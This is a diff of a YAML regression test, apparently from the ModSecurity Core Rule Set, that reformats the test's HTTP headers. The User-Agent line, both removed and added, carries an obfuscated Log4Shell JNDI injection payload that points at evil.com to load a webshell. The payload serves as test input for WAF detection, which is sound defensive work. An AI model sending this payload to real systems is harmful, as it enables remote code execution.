@@ -14,8 +14,8 @@
             input:
               dest_addr: "127.0.0.1"
               headers:
-                      Accept: */*
-                  User-Agent: ModSecurity CRS 3 Tests ${:1337:-\$}{jndi:ldap://evil.com/webshell}'
+                  Accept: "*/*"
+                  User-Agent: ModSecurity CRS 3 Tests ${:1337:-\$}{jndi:ldap://evil.com/webshell}
                   Host: "localhost"
               method: "GET"
               port: 80
